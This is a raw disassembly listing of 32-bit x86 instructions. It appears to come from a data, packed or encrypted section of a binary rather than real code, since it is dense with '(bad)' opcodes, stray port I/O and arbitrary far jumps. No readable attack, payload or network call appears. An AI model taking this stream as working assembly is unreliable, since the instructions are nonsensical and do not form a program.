  428139:	mul    BYTE PTR [ebx-0x2b]
  42813c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42813d:	mov    DWORD PTR [ecx+0x73f14757],ebx
  428143:	in     al,dx
  428144:	jl     0x42813c
  428146:	mov    cl,BYTE PTR [edx+ebx*1-0x64654fac]
  42814d:	loopne 0x428184
  42814f:	(bad)  
  428150:	fcomip st,st(3)
  428152:	outs   dx,BYTE PTR ds:[esi]
  428153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428154:	and    edi,DWORD PTR [edi+0x18080269]
  42815a:	dec    ecx
  42815b:	ins    BYTE PTR es:[edi],dx
  42815c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42815d:	xchg   ebx,eax
  42815e:	in     eax,dx
  42815f:	cmp    esp,DWORD PTR [ecx-0x65281026]
  428165:	cmp    DWORD PTR [eax],0xc1e52435
  42816b:	add    eax,0x6a
	...
  4281d4:	add    BYTE PTR [eax],al
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	pop    esi
  4281e3:	rcr    DWORD PTR [eax+0x1ad9060],1
  4281e9:	add    bh,bh
  4281eb:	add    BYTE PTR [eax],al
  4281ed:	add    al,ch
  4281ef:	xchg   BYTE PTR [esi-0x13],dl
  4281f2:	js     0x428238
  4281f4:	test   BYTE PTR ss:[ebp+esi*4-0x22],bh
  4281f9:	cmp    eax,0x545c13bd
  4281fe:	stos   BYTE PTR es:[edi],al
  4281ff:	test   BYTE PTR fs:[eax+edx*1+0x38],ah
  428204:	cmp    al,0xfb
  428206:	jnp    0x4281f0
  428208:	xchg   edi,eax
  428209:	jecxz  0x42826e
  42820b:	mov    ds:0xc5b61fea,eax
  428210:	adc    eax,0xbf992c01
  428215:	jne    0x4281d9
  428217:	add    al,0xf5
  428219:	add    eax,0x400ad6f3
  42821e:	xchg   ebp,eax
  42821f:	inc    esi
  428220:	mov    ds:0xfb0fb07a,al
  428225:	cdq    
  428226:	js     0x428214
  428228:	inc    edx
  428229:	les    ecx,FWORD PTR [edi]
  42822b:	retf   0xd9ec
  42822e:	jmp    0x428279
  428230:	fistp  WORD PTR [eax+0x26]
  428233:	lahf   
  428234:	fisubr DWORD PTR [edx+0x39]
  428237:	sahf   
  428238:	add    eax,DWORD PTR [eax]
  42823a:	jmp    0x875c:0x5af0b260
  428241:	dec    eax
  428242:	retf   
  428243:	cmp    bl,BYTE PTR [edx+ebp*2-0x5a0df4b8]
  42824a:	ins    BYTE PTR es:[edi],dx
  42824b:	push   ds
  42824c:	nop
  42824d:	add    cl,dl
  42824f:	push   ss
  428250:	lahf   
  428251:	jge    0x4281e3
  428253:	lahf   
  428254:	data16 mov bl,0x97
  428257:	outs   dx,BYTE PTR gs:[esi]
  428259:	bound  esp,QWORD PTR [eax]
  42825b:	jne    0x428290
  42825d:	mov    al,0x96
  42825f:	arpl   WORD PTR [eax-0x19e6b505],sp
  428265:	cmp    DWORD PTR [ebx],ecx
  428267:	xor    edi,0x6
  42826a:	push   edx
  42826c:	push   ds
  42826d:	nop
  42826e:	xor    BYTE PTR [edi+0x220bc668],cl
  428274:	cli    
  428275:	icebp  
  428276:	mov    esp,0x3f02c5b1
  42827b:	push   ss
  42827c:	gs dec esp
  42827e:	xchg   edi,eax
  42827f:	mov    DWORD PTR [edi+0xe94a2a2],esi
  428285:	in     al,0x5
  428287:	fsub   DWORD PTR [ecx*8-0xa2ee102]
  42828e:	sub    al,0x3f
  428290:	mov    ds:0xd63786c9,ax
  428296:	rol    DWORD PTR [eax],cl
  428298:	aas    
  428299:	mov    al,BYTE PTR [ebp-0x5e53e682]
  42829f:	stos   DWORD PTR es:[edi],eax
  4282a0:	push   0xa62f8466
  4282a5:	call   0x62df:0xa83fde37
  4282ac:	sbb    al,0x7c
  4282ae:	ins    DWORD PTR es:[edi],dx
  4282af:	lods   al,BYTE PTR ds:[esi]
  4282b0:	jge    0x4282fe
  4282b2:	jl     0x42832b
  4282b4:	mov    ebx,esi
  4282b6:	in     al,dx
  4282b7:	cmp    eax,0xc20036ab
  4282bc:	jb     0x428337
  4282be:	out    0xec,eax
  4282c0:	inc    ebx
  4282c1:	clc    
  4282c2:	ins    BYTE PTR es:[edi],dx
  4282c3:	jmp    0xf36b:0xb9634198
  4282ca:	push   edi
  4282cb:	or     eax,0x34b4db1c
  4282d0:	xchg   cl,ch
  4282d2:	fnsetpm(287 only) 
  4282d4:	in     eax,0xb9
  4282d6:	mov    eax,0xf34d3348
  4282db:	imul   al
  4282dd:	sbb    BYTE PTR [ecx+0x51e5c294],cl
  4282e3:	test   al,0xd3
  4282e5:	mov    ebx,0xae659cc2
  4282ea:	test   eax,0x3052
	...
  428353:	add    BYTE PTR [eax],al
  428355:	add    bh,al
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	ror    BYTE PTR [ebp-0x5170c59f],cl
  428368:	add    DWORD PTR [eax],eax
  42836a:	inc    DWORD PTR [eax]
  42836c:	add    BYTE PTR [eax],al
  42836e:	mov    edx,0x7434699e
  428373:	loope  0x428357
  428375:	test   DWORD PTR [esp+eiz*4-0x25],eax
  428379:	and    al,0x5b
  42837b:	jae    0x428359
  42837d:	scas   al,BYTE PTR es:[edi]
  42837e:	cmp    al,0x4a
  428380:	jne    0x42837c
  428382:	fs aaa 
  428384:	push   ds
  428385:	jmp    0x30bfa920
  42838a:	(bad)  
  42838b:	sbb    ebx,DWORD PTR [esi+0x35]
  42838e:	popf   
  42838f:	jnp    0x428401
  428391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428392:	ja     0x428406
  428394:	inc    edi
  428395:	mov    bl,0x14
  428397:	push   ss
  428398:	outs   dx,DWORD PTR ds:[esi]
  428399:	jno    0x428325
  42839b:	cmp    eax,0x15b3a2f3
  4283a0:	popf   
  4283a1:	and    edx,ecx
  4283a3:	lock pop es
  4283a5:	arpl   WORD PTR [ebp+0x58],di
  4283a8:	dec    eax
  4283a9:	dec    edx
  4283aa:	scas   eax,DWORD PTR es:[edi]
  4283ab:	add    al,0x9e
  4283ad:	push   es
  4283ae:	outs   dx,BYTE PTR ds:[esi]
  4283af:	add    esp,DWORD PTR [eax+0x6f705840]
  4283b5:	and    al,0xec
  4283b7:	bndstx [esi-0x74],bnd0
  4283bb:	cmp    BYTE PTR [esi+esi*2-0x5ee1ad3b],bl
  4283c2:	xor    eax,0x2eb09a90
  4283c7:	jmp    0x40e0:0xebd38e00
  4283ce:	jmp    0x5807:0xf92ce78f
  4283d5:	iret   
  4283d6:	es sub dl,ch
  4283d9:	in     al,dx
  4283da:	lock pop ebx
  4283dc:	add    BYTE PTR [esi-0x15c41241],0x51
  4283e3:	pop    ss
  4283e4:	cmc    
  4283e5:	sbb    BYTE PTR [eax-0x80],dl
  4283e8:	adc    esi,DWORD PTR [esi-0x44]
  4283eb:	or     BYTE PTR [esi+edx*2+0x71de5684],dl
  4283f2:	mov    ecx,0xdb3af5e3
  4283f7:	mov    WORD PTR [ecx+0x3f09fdc2],ds
  4283fd:	adc    eax,0xea61c94e
  428402:	jg     0x4283a2
  428404:	pop    esi
  428405:	adc    BYTE PTR [eax-0x5d742539],cl
  42840b:	pushf  
  42840c:	adc    esi,DWORD PTR [ebp+0x6d138624]
  428412:	dec    ecx
  428413:	sbb    al,0x9
  428415:	popf   
  428416:	arpl   WORD PTR [esi+esi*4],dx
  428419:	pop    ss
  42841a:	test   eax,0x81e6de9b
  42841f:	jg     0x428473
  428421:	mov    ebp,0x5100dc34
  428426:	stc    
  428427:	xchg   esp,eax
  428428:	shl    eax,1
  42842a:	mov    ecx,0x2431fd8c
  42842f:	subps  xmm3,XMMWORD PTR [edx+eax*8]
  428433:	adc    ah,bl
  428435:	mov    cl,0xcf
  428437:	mov    ebp,0x9a024452
  42843c:	fptan  
  42843e:	dec    ecx
  42843f:	test   DWORD PTR [eax],eax
  428441:	clc    
  428442:	jno    0x42846d
  428444:	lods   eax,DWORD PTR ds:[esi]
  428445:	js     0x4283f2
  428447:	aaa    
  428448:	aad    0xad
  42844a:	jb     0x428469
  42844c:	(bad)  
  42844e:	or     al,0x8f
  428450:	pusha  
  428451:	loope  0x4284c4
  428453:	enter  0x97f1,0x2c
  428457:	cld    
  428458:	push   eax
  428459:	(bad)  
  42845a:	jb     0x4283ed
  42845c:	mov    ds:0xdeecd13a,eax
  428461:	inc    ecx
  428462:	mov    ah,0x2f
  428464:	mov    bh,BYTE PTR [ebx+edi*8-0x66]
  428468:	sahf   
  428469:	cmp    ch,BYTE PTR [ebx+0x8343]
	...
  4284d3:	add    BYTE PTR [eax],al
  4284d5:	add    BYTE PTR [esi],cl
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0xb8abfb32
  4284e3:	clc    
  4284e4:	rcr    DWORD PTR [esi+0x1af8e],cl
  4284ea:	inc    DWORD PTR [eax]
  4284ec:	add    BYTE PTR [eax],al
  4284ee:	aam    0xc1
  4284f0:	addr16 push esp
  4284f2:	leave  
  4284f3:	sub    bl,0x2
  4284f6:	mov    edx,0x233e0589
  4284fb:	fdivr  QWORD PTR [ecx]
  4284fd:	xor    ecx,DWORD PTR [edi-0xd]
  428500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	sar    DWORD PTR ds:0x8d59e101,cl
  428507:	or     al,BYTE PTR [edx+0x79023eac]
  42850d:	popfw  
  42850f:	and    esi,DWORD PTR [ebp-0x65]
  428512:	sbb    al,0xc9
  428514:	imul   ebx,DWORD PTR [esi],0x1168237e
  42851a:	loop   0x4284b5
  42851c:	mov    eax,0x22022b33
  428521:	mov    al,ds:0xc143c21e
  428526:	dec    edi
  428527:	add    DWORD PTR [eax-0x5282ab3e],edx
  42852d:	jae    0x428584
  42852f:	shr    DWORD PTR [ebx+0x1f],cl
  428532:	and    BYTE PTR [eax],al
  428534:	mov    DWORD PTR [eax+eiz*4],esi
  428537:	mov    DWORD PTR [ebx],ecx
  428539:	dec    edi
  42853a:	cdq    
  42853b:	scas   al,BYTE PTR es:[edi]
  42853c:	fadd   DWORD PTR [edx]
  42853e:	or     al,0x51
  428540:	push   esp
  428541:	jl     0x42854e
  428543:	sub    al,0x35
  428545:	outs   dx,DWORD PTR ds:[esi]
  428546:	lods   eax,DWORD PTR ds:[esi]
  428547:	cmp    al,0xfa
  428549:	or     BYTE PTR [edi],al
  42854b:	stc    
  42854c:	pop    edx
  42854d:	cmp    al,0xed
  42854f:	add    ebx,0xa
  428552:	rcl    BYTE PTR [edi],cl
  428554:	das    
  428555:	mov    al,0x1d
  428557:	xor    BYTE PTR [eax-0x3c24e224],0x60
  42855e:	data16 fisubr DWORD PTR [ecx-0x5c]
  428562:	pop    ss
  428563:	popf   
  428564:	xor    ecx,eax
  428566:	jmp    0x4e585a7c
  42856b:	pop    ds
  42856c:	(bad)  
  42856d:	jl     0x4285d3
  42856f:	sbb    BYTE PTR ds:0xe66b4400,bl
  428575:	jbe    0x428505
  428577:	ror    DWORD PTR [esi+0x6613ab7],cl
  42857d:	mov    ah,0xb1
  42857f:	ins    BYTE PTR es:[edi],dx
  428580:	xchg   edi,eax
  428581:	xor    bh,al
  428583:	fincstp 
  428585:	mov    ecx,0xd9492f54
  42858a:	jbe    0x4285e6
  42858c:	mov    esp,0xba083d83
  428591:	in     al,0xed
  428593:	push   0xa2c640ba
  428598:	push   cs
  428599:	xor    ecx,DWORD PTR [esi+edi*4]
  42859c:	and    eax,0x9e66f95
  4285a1:	mov    bl,0x27
  4285a3:	and    eax,0xfac89be6
  4285a8:	lods   al,BYTE PTR ds:[esi]
  4285a9:	inc    esi
  4285aa:	in     al,0xcc
  4285ac:	fdivr  QWORD PTR [edx-0x54]
  4285af:	popw   es
  4285b1:	sbb    al,BYTE PTR [ebp+0x46]
  4285b4:	leave  
  4285b5:	jl     0x428630
  4285b7:	add    DWORD PTR [ebp+0x3a8def0a],edx
  4285bd:	ins    BYTE PTR es:[edi],dx
  4285be:	xchg   ecx,eax
  4285bf:	or     DWORD PTR [esi+ecx*8],ebx
  4285c2:	pushf  
  4285c3:	adc    BYTE PTR [ecx],dl
  4285c5:	pushf  
  4285c6:	xchg   DWORD PTR [edx-0x51],edx
  4285c9:	pushf  
  4285ca:	mov    ?,WORD PTR [ebx]
  4285cc:	push   cs
  4285cd:	rcr    BYTE PTR [esi-0x6f26a090],1
  4285d3:	dec    eax
  4285d4:	sub    edx,DWORD PTR [ebx]
  4285d6:	sti    
  4285d7:	mov    cl,0xa4
  4285d9:	cs mov edx,0xf1d03fd
  4285df:	sub    DWORD PTR fs:0x3d00a406,0xcdb1b331
  4285ea:	imul   edx,DWORD PTR [ebx+0x74],0x0
	...
  428655:	add    BYTE PTR [ecx-0xa],dl
  428658:	xor    eax,0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x15b3a3f6
  428664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428665:	mov    eax,0x1b08d
  42866a:	inc    DWORD PTR [eax]
  42866c:	add    BYTE PTR [eax],al
  42866e:	or     al,0x5f
  428670:	pop    ds
  428671:	xor    al,0x8f
  428673:	repz test BYTE PTR [edi],0x64
  428677:	xor    esi,DWORD PTR [ebp+0x32888d2]
  42867d:	dec    esp
  42867e:	push   0x96cf6f22
  428683:	sbb    al,0xe0
  428685:	(bad)  
  428686:	rol    DWORD PTR [edx-0x1c35f377],1
  42868c:	call   0xf7adbb4d
  428691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428692:	push   ebp
  428693:	mov    ds:0x5755938,al
  428698:	or     al,0x35
  42869a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42869b:	retf   
  42869c:	mov    cl,0xf5
  42869e:	arpl   WORD PTR [edi],ax
  4286a0:	xor    DWORD PTR [esi+0x63ae7953],ebx
  4286a6:	fimul  WORD PTR [edi+0x25d082a]
  4286ac:	outs   dx,BYTE PTR ds:[esi]
  4286ad:	outs   dx,BYTE PTR ds:[esi]
  4286ae:	in     eax,0x59
  4286b0:	inc    edi
  4286b1:	cmp    BYTE PTR [eax],ch
  4286b3:	lock fisttp WORD PTR [esi+0x68a1c208]
  4286ba:	xchg   esp,eax
  4286bb:	or     DWORD PTR [ecx],esi
  4286bd:	jle    0x4286f9
  4286bf:	push   ecx
  4286c0:	push   0x971ce03b
  4286c5:	xor    DWORD PTR [edx+0x2a],0xffffffc6
  4286c9:	mov    ebx,0xf208563
  4286ce:	add    DWORD PTR [ecx],ebp
  4286d0:	mov    eax,0x2158f662
  4286d5:	enter  0x1abb,0x30
  4286d9:	int3   
  4286da:	dec    esp
  4286db:	dec    ecx
  4286dc:	addr16 call 0xe6a1011b
  4286e2:	jge    0x4286c2
  4286e4:	push   esp
  4286e5:	add    DWORD PTR [eax-0x3],edx
  4286e8:	stos   BYTE PTR es:[edi],al
  4286e9:	cmp    al,0x2b
  4286eb:	mov    esi,0xadbe6cd7
  4286f0:	pop    ds
  4286f1:	ret    
  4286f2:	(bad)  
  4286f3:	xlat   BYTE PTR ds:[ebx]
  4286f4:	mov    BYTE PTR [ebp+0x78],0x4
  4286f8:	imul   ebx,DWORD PTR [ebx-0x67cc3153],0xd063ad88
  428702:	pop    ebx
  428703:	fxch   st(5)
  428705:	adc    DWORD PTR [ebx-0x718bb051],ebp
  42870b:	loop   0x428734
  42870d:	xchg   edi,eax
  42870e:	in     eax,dx
  42870f:	out    0x80,eax
  428711:	inc    edi
  428712:	inc    ebp
  428713:	imul   esp,DWORD PTR [esi+0x48],0x62
  428717:	pop    ss
  428718:	adc    ch,bl
  42871a:	aaa    
  42871b:	and    DWORD PTR [edx+0x12],edi
  42871e:	sbb    al,0xc6
  428720:	push   edx
  428721:	retf   
  428722:	xchg   esp,eax
  428723:	jg     0x428781
  428725:	inc    esp
  428726:	mov    ds:0xeb337e48,al
  42872b:	sub    BYTE PTR [esi-0x6f],cl
  42872e:	pop    ebx
  42872f:	cmp    al,0xbe
  428731:	loope  0x4286d2
  428733:	sub    eax,0x293c7ad5
  428738:	mov    ah,0x35
  42873a:	int    0xb5
  42873c:	in     al,dx
  42873d:	mov    esp,0x66388258
  428742:	popa   
  428743:	inc    edx
  428744:	push   ds
  428745:	mov    esp,0x121e91d4
  42874a:	jne    0x4286dc
  42874c:	repz in al,dx
  42874e:	aam    0x8e
  428750:	inc    edx
  428751:	dec    eax
  428752:	mov    WORD PTR [edi],ds
  428754:	push   ebp
  428755:	lods   eax,DWORD PTR ds:[esi]
  428756:	fcomip st,st(3)
  428758:	je     0x4287c1
  42875a:	(bad)  
  42875b:	mov    eax,ds:0xc3fe1a1
  428760:	popf   
  428761:	adc    BYTE PTR [edi-0x7c9f5079],ah
  428767:	mov    DWORD PTR [esi],esp
  428769:	loope  0x42876e
  42876b:	popa   
  42876c:	inc    esp
	...
  4287d5:	add    BYTE PTR [esi+0x5b],dl
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x3e600df8
  4287e5:	push   ss
  4287e6:	mov    WORD PTR [ecx+0xff0001],?
  4287ec:	add    BYTE PTR [eax],al
  4287ee:	(bad)  
  4287f0:	cmp    al,al
  4287f2:	adc    eax,DWORD PTR [edx-0x80]
  4287f5:	dec    esi
  4287f6:	iret   
  4287f7:	arpl   WORD PTR [eax*4+0x41cbecc5],ax
  4287fe:	pushf  
  4287ff:	mov    ds:0x7c244859,eax
  428804:	jo     0x4287b5
  428806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428807:	retf   0xc045
  42880a:	jne    0x428831
  42880c:	push   0xffffffbb
  42880e:	dec    ebp
  42880f:	dec    esp
  428810:	mov    WORD PTR [ecx-0x15],?
  428813:	test   ch,al
  428815:	add    DWORD PTR [ebp+0x6109563e],0xb0b67b17
  42881f:	jmp    DWORD PTR [edi]
  428821:	xchg   edi,eax
  428822:	xor    esp,DWORD PTR [esi]
  428824:	push   es
  428825:	and    DWORD PTR [edi],eax
  428827:	pop    esi
  428828:	jns    0x4287d6
  42882a:	int    0x76
  42882c:	(bad)  
  42882e:	ins    DWORD PTR es:[edi],dx
  42882f:	(bad)  
  428830:	(bad)  
  428831:	jns    0x428844
  428833:	add    al,0xea
  428835:	mov    al,ds:0x53ac11ee
  42883a:	add    al,bh
  42883c:	sbb    BYTE PTR [eax],dl
  42883e:	inc    eax
  42883f:	xor    al,0x69
  428841:	dec    edx
  428842:	xchg   edx,eax
  428843:	inc    eax
  428844:	idiv   eax
  428846:	jl     0x4288b7
  428848:	push   ebp
  428849:	hlt    
  42884a:	(bad)  
  42884b:	push   ds
  42884c:	or     edi,edi
  42884e:	out    dx,eax
  42884f:	cld    
  428850:	clc    
  428851:	ss ds jecxz 0x42889d
  428855:	add    DWORD PTR [ecx],ebp
  428857:	(bad)  
  428858:	leave  
  428859:	or     edi,esi
  42885b:	mov    ebp,DWORD PTR [ebx]
  42885d:	out    dx,al
  42885e:	iret   
  42885f:	and    esp,edi
  428861:	cmc    
  428862:	dec    edi
  428863:	pop    esp
  428864:	adc    BYTE PTR [ebx+0x44],al
  428867:	add    bl,ch
  428869:	push   0x4038ef8
  42886e:	icebp  
  42886f:	leave  
  428870:	cli    
  428871:	leave  
  428872:	xor    ecx,edi
  428874:	ins    BYTE PTR es:[edi],dx
  428875:	push   ebx
  428876:	push   0x59d29498
  42887b:	and    DWORD PTR [edi],edx
  42887d:	and    al,0xac
  42887f:	mov    al,0x2c
  428881:	mov    esp,esi
  428883:	push   ebp
  428884:	cmp    esi,DWORD PTR [edx]
  428886:	and    eax,0x27f994bc
  42888b:	fcomp  DWORD PTR [eax+0x61]
  42888e:	cwde   
  42888f:	push   ss
  428890:	mov    eax,ds:0x5421fe6
  428895:	mov    ch,0xb3
  428897:	daa    
  428898:	add    ebp,ecx
  42889a:	fs dec ebp
  42889c:	fwait
  42889d:	imul   eax,ebx,0x12053d44
  4288a3:	repnz lea esp,[ebp-0x4a]
  4288a7:	out    dx,al
  4288a8:	jge    0x428864
  4288aa:	or     dl,0xcb
  4288ad:	nop
  4288ae:	and    al,0xf4
  4288b0:	int3   
  4288b1:	pusha  
  4288b2:	and    eax,0x75bd56fe
  4288b7:	in     eax,dx
  4288b8:	es xchg ebp,eax
  4288ba:	fs scas al,BYTE PTR es:[edi]
  4288bc:	jb     0x42892a
  4288be:	mov    ds:0x9846967d,eax
  4288c3:	cli    
  4288c4:	mov    ds:0xa74b43f5,al
  4288c9:	(bad)  
  4288ca:	pushf  
  4288cb:	inc    esi
  4288cc:	xchg   edi,eax
  4288cd:	std    
  4288ce:	mov    ebp,DWORD PTR ds:[ebx-0x54ff2cf1]
  4288d5:	push   0x29
  4288d7:	mov    ebx,0x70a51786
  4288dc:	popa   
  4288dd:	mov    dl,0x5c
  4288df:	push   esi
  4288e0:	shl    BYTE PTR [esi],1
  4288e2:	jnp    0x4288cb
  4288e4:	mov    dh,0x22
  4288e6:	push   0x7e
  4288e8:	fst    QWORD PTR [eax+0xf61967]
	...
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi+0x10a59d0f],bx
  428964:	cmp    cl,BYTE PTR [edi]
  428966:	mov    esi,DWORD PTR [edx+0xff0001]
  42896c:	add    BYTE PTR [eax],al
  42896e:	into   
  42896f:	je     0x4289b4
  428971:	add    al,0x1e
  428973:	int    0xf7
  428975:	jle    0x4289b3
  428977:	add    DWORD PTR [ecx+ecx*4-0x4007a250],0x45
  42897f:	test   eax,0x76fe713f
  428984:	sbb    DWORD PTR [edi-0xb7df2e7],edi
  42898a:	and    DWORD PTR [eax-0x2b],edx
  42898d:	call   0xa58e:0x81f6b57
  428994:	(bad)  ds:0xd4f7e111
  42899a:	(bad)  
  42899b:	sbb    ebp,eax
  42899d:	lahf   
  42899e:	or     eax,0x8a23d311
  4289a3:	dec    esp
  4289a4:	pop    eax
  4289a5:	repz sbb bl,bl
  4289a8:	pop    esi
  4289a9:	out    dx,eax
  4289aa:	stos   BYTE PTR es:[edi],al
  4289ab:	lock clc 
  4289ad:	int3   
  4289ae:	mov    al,ds:0xc560c65e
  4289b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289b4:	mov    ebx,0x83af8c41
  4289b9:	inc    ecx
  4289ba:	or     ch,ah
  4289bc:	outs   dx,BYTE PTR ds:[esi]
  4289bd:	and    ebx,DWORD PTR [ecx+0x32470e5d]
  4289c3:	in     eax,0x3c
  4289c5:	addr16 sahf 
  4289c7:	hlt    
  4289c8:	sub    WORD PTR [edx-0x4e458665],cx
  4289cf:	stos   BYTE PTR es:[edi],al
  4289d0:	(bad)  
  4289d1:	(bad)  
  4289d3:	ror    DWORD PTR es:[eax],0x95
  4289d7:	mov    ebp,0x5ba36b17
  4289dc:	sub    al,0x55
  4289de:	sub    ebp,DWORD PTR [eax+0x7c]
  4289e1:	push   es
  4289e2:	xor    DWORD PTR [eax+0x78473154],eax
  4289e8:	fdivr  DWORD PTR [ebp+0x4d5bafd]
  4289ee:	inc    ebp
  4289ef:	mov    BYTE PTR [ecx-0xe4c546b],al
  4289f5:	scas   eax,DWORD PTR es:[edi]
  4289f6:	sub    al,0x6
  4289f8:	or     eax,0x6c9d12e2
  4289fd:	out    dx,eax
  4289fe:	mov    esp,0xa6e4c929
  428a03:	iret   
  428a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a05:	mov    eax,0xd119ff04
  428a0a:	push   ebp
  428a0b:	dec    ecx
  428a0c:	mov    edx,0xe19c8126
  428a11:	les    edx,FWORD PTR [ebp*1+0x47d7457c]
  428a18:	js     0x4289f4
  428a1a:	xchg   DWORD PTR [esi+0x3821b79d],ebx
  428a20:	out    dx,al
  428a21:	jge    0x428a7e
  428a23:	(bad)  
  428a24:	fbld   TBYTE PTR [ecx+ebx*2]
  428a27:	out    dx,al
  428a28:	outs   dx,BYTE PTR ds:[esi]
  428a29:	jns    0x428a23
  428a2b:	sbb    eax,0x90bd8b5b
  428a30:	scas   al,BYTE PTR es:[edi]
  428a31:	push   esp
  428a32:	or     BYTE PTR [esi+ecx*8-0x781392ce],0xb6
  428a3a:	jbe    0x428a2f
  428a3c:	push   es
  428a3d:	and    al,0x83
  428a3f:	imul   esi,DWORD PTR [esi],0xffffffcb
  428a42:	mov    al,ds:0xbf9d6abc
  428a47:	adc    esi,eax
  428a49:	stos   BYTE PTR es:[edi],al
  428a4a:	pop    esi
  428a4b:	and    ecx,esp
  428a4d:	push   esp
  428a4e:	(bad)  
  428a50:	popf   
  428a51:	adc    bl,dl
  428a53:	loop   0x428a32
  428a55:	xchg   edx,eax
  428a56:	pusha  
  428a57:	push   ebx
  428a58:	sub    esi,esi
  428a5a:	clc    
  428a5b:	jbe    0x428aca
  428a5d:	adc    dh,BYTE PTR [ebp+ebp*1-0x2d]
  428a61:	(bad)  
  428a62:	mov    bl,0x94
  428a64:	out    dx,eax
  428a65:	sbb    al,0x64
  428a67:	inc    esp
  428a68:	and    bh,BYTE PTR [ecx-0x3c]
  428a6b:	xchg   ebp,eax
  428a6c:	arpl   WORD PTR [eax],ax
	...
  428ad6:	dec    ebp
  428ad7:	or     al,0xf8
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax-0x371aeded]
  428ae5:	jmp    0xff:0x1b38a
  428aec:	add    BYTE PTR [eax],al
  428aee:	ret    0xd464
  428af1:	popf   
  428af2:	sub    ebp,DWORD PTR [edx+ecx*2]
  428af5:	push   esp
  428af6:	cmp    bh,BYTE PTR [ecx]
  428af8:	imul   eax,DWORD PTR [ecx-0x1e983492],0x5b90a2e8
  428b02:	(bad)  
  428b03:	mov    eax,0x50dcfa11
  428b08:	imul   DWORD PTR [ecx]
  428b0a:	cmp    cl,cl
  428b0c:	mov    cl,0xe9
  428b0e:	mov    al,0x56
  428b10:	(bad)  
  428b11:	cdq    
  428b12:	xor    edi,esi
  428b14:	lea    ebx,[esi]
  428b16:	sbb    BYTE PTR [ebx],dl
  428b18:	push   0xffffff83
  428b1a:	mov    eax,ds:0xddd0c790
  428b1f:	fdivr  st(7),st
  428b21:	es (bad) 
  428b23:	mov    esi,0x21f10db4
  428b28:	push   ebx
  428b29:	nop
  428b2a:	inc    ebp
  428b2b:	imul   edx,edi,0xffffff88
  428b2e:	and    dl,dl
  428b30:	clc    
  428b31:	add    ebp,DWORD PTR [ebx]
  428b33:	pop    edx
  428b34:	in     al,dx
  428b35:	std    
  428b36:	not    BYTE PTR [ebx+0x3]
  428b39:	call   0x8b5f192f
  428b3e:	hlt    
  428b3f:	xor    ch,BYTE PTR ss:[ecx+0x4b5083bc]
  428b46:	(bad)  
  428b47:	hlt    
  428b48:	out    dx,al
  428b49:	inc    ebx
  428b4a:	mov    ds:0x9a4a561d,al
  428b4f:	rcr    BYTE PTR [ebx-0x6c84c663],1
  428b55:	push   0x2842f706
  428b5a:	xor    eax,0x6864edfe
  428b5f:	mov    dh,0x81
  428b61:	jae    0x428b67
  428b63:	pop    eax
  428b64:	mov    esi,0x366f2712
  428b69:	mov    WORD PTR [edx-0x4f],ss
  428b6c:	adc    cl,dl
  428b6e:	inc    ecx
  428b6f:	push   ebx
  428b70:	aaa    
  428b71:	lds    eax,FWORD PTR [edx+0x10]
  428b74:	jns    0x428b0a
  428b76:	arpl   WORD PTR [edx-0x54],cx
  428b79:	es test al,0x2
  428b7c:	hlt    
  428b7d:	test   al,0xf
  428b7f:	pop    edx
  428b81:	retf   0x89ec
  428b84:	pop    edx
  428b85:	xchg   ebx,eax
  428b86:	dec    esi
  428b87:	and    eax,0xc8c57a8b
  428b8c:	jns    0x428b74
  428b8e:	retf   0xfe6b
  428b91:	sub    BYTE PTR ds:0x60cbd576,cl
  428b97:	or     BYTE PTR [edx-0x25d2f51a],dh
  428b9d:	xchg   al,ch
  428b9f:	mov    al,ds:0x80468ce2
  428ba4:	or     esi,DWORD PTR [edx]
  428ba6:	push   ecx
  428ba7:	xor    ecx,DWORD PTR cs:[ebp-0x6f]
  428bab:	mov    ebp,0xa8b7c2fc
  428bb0:	xchg   edx,eax
  428bb1:	adc    BYTE PTR [eax],cl
  428bb3:	sar    DWORD PTR [ebp+0xd579044],1
  428bb9:	push   esp
  428bba:	sahf   
  428bbb:	cpuid  
  428bbd:	push   0xd3eca254
  428bc2:	repnz push 0xf67a2a7d
  428bc8:	(bad)  
  428bc9:	mov    esi,0xe1c3a68d
  428bce:	inc    BYTE PTR [edi-0x73]
  428bd1:	inc    ecx
  428bd2:	dec    eax
  428bd3:	ja     0x428b7c
  428bd5:	fnstsw WORD PTR [esi]
  428bd7:	retf   
  428bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428bd9:	mov    edx,0x2648e2c9
  428bde:	add    al,0x2a
  428be0:	loopne 0x428c0c
  428be2:	sahf   
  428be3:	in     eax,0xd1
  428be5:	jb     0x428b9e
  428be7:	sbb    BYTE PTR [esi+0x4b],ch
  428bea:	clc    
  428beb:	mov    ebx,0x4b
	...
  428c54:	add    BYTE PTR [eax],al
  428c56:	lds    edx,FWORD PTR [ebp-0x76]
  428c59:	cli    
